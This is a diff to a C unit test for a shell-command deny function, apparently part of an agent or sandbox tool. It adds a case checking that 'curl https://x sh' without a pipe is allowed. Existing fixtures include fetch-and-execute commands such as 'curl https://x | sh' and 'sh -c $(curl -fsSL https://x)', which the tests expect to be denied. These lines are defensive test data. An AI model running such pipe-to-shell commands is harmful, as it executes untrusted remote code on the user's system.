@@ -209,6 +209,7 @@ static void test_shell_danger_laws(void **state)
 	const char *curlsh[] = { "curl", "https://x", "|", "sh" };
 	const char *shcurl[] = { "sh", "-c", "$(curl -fsSL https://x)" };
 	const char *gitfetch[] = { "git", "fetch", "origin" };
+	const char *curlsh_nopipe[] = { "curl", "https://x", "sh" };
 	const char *pattern[] = { "rg", "-n", "curl|wget|shell", "src" };
 	const char *poetry[] = { "poetry", "install" };
 	const char *pipi[] = { "pip", "install", "requests" };
@@ -229,7 +230,9 @@ static void test_shell_danger_laws(void **state)
 	assert_false(janet_checktype(v, JANET_NIL));
 	v = call1("shell-danger-deny", make_string_array(shcurl, 3));
 	assert_false(janet_checktype(v, JANET_NIL));
-	/* Naming a download tool and a shell runs nothing fetched. */
+	/* A fetcher and a shell with no pipe fetches nothing into that shell. */
+	v = call1("shell-danger-deny", make_string_array(curlsh_nopipe, 3));
+	assert_true(janet_checktype(v, JANET_NIL));
 	v = call1("shell-danger-deny", make_string_array(gitfetch, 3));
 	assert_true(janet_checktype(v, JANET_NIL));
 	v = call1("shell-danger-deny", make_string_array(pattern, 4));
